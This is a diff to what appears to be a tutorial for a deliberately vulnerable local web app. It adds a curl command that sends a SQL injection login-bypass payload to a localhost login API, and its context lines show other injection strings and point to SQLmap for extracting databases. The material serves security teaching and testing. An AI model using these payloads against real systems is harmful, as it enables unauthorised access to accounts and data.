@@ -175,6 +175,14 @@ admin'--
 admin' OR '1'='1
 ```
 
+**Alternative: Using curl**
+You can also verify the vulnerability using `curl` from the terminal:
+```bash
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
+```
+
 #### Method 2: Using SQLmap (Advanced)
 
 SQLmap is a powerful automated SQL injection tool that can extract entire databases.
